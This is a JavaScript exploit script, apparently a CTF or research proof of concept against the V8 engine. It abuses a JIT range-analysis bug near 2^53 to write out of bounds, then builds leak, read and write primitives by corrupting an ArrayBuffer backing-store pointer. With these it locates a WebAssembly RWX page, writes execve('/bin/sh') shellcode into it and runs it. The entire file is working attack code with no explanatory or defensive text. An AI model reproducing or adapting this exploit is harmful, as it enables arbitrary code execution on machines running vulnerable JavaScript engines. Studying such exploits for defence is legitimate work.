var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// console.log(itof(0x414000000000n)) = 3.5445817692284e-310;


let arr1 = undefined;
let arr2 = undefined;
let arr3 = undefined;
let arr4 = undefined;



function f(x)
{
  const a = [0x13371337, 2.2, 3.3, 4.4, 5.5,0x13371337, 2.2, 3.3, 4.4, 5.5];
  const b = [0x13381338, 2.2, 3.3, 4.4, 5.5];
  const c = [Array,2.2];
  // const buf = new ArrayBuffer(0x100);
  let t = (x == 1 ? 9007199254740992 : 9007199254740989) + 1 + 1;
  t -= 9007199254740991; // t can be 5, but expect <= 3
  t *= 8;
  arr1 = a;
  arr2 = b;
  arr3 = c;
  // arr4 = buf;
  a[t] = 3.5445817692284e-310;
}

console.log(f(1));
for(var i = 0;i < 100000;i++){
  f(0);
}
arr3_offset = 11;

console.log(ftoi(f(1)).toString(16));
%DebugPrint(arr1);
%DebugPrint(arr2);
%DebugPrint(arr3);

arr4 = new ArrayBuffer(0x130);
let idx = 0;
// arr4[0] = itof(0xc0d3c0d3c0d3c0d3n);
%DebugPrint(arr4);
for(var i = 0;i < 1000;i++){
  if (arr2[i] == itof(0x0000000000000130n)){
      idx = i;
      break;
  }
}
console.log(idx);

function leak(val){
  arr3[0] = val;
  return arr2[arr3_offset];
}

function read8(addr){
  arr2[idx + 1] = itof(BigInt(addr));
  let val_ = new Float64Array(arr4);
  return val_[0];
}

function write_bug(addr,val){
  arr2[idx+1] = itof(BigInt(addr));
  let var_ = new Uint8Array(arr4);
  var_[0] = val;
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_instance_leak = ftoi(leak(wasm_instance)) - 0x1n;
console.log("wasm_instance_leak  = " + wasm_instance_leak.toString(16));

rwx_pointer = wasm_instance_leak + 0xf8n;
console.log("rwx_pointer = " + rwx_pointer.toString(16));


var rwx = ftoi(read8(rwx_pointer));
console.log("rwx = " + rwx.toString(16));
// %DebugPrint(obj1);

shellcode= new Uint8Array([106,0,72,141,61,17,0,0,0,87,72,141,52,36,72,49,210,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0])
for(var i = 0; i < shellcode.length;i++){
  var value = shellcode[i];   
  write_bug(rwx+BigInt(i),value);
}
f();
// readline();

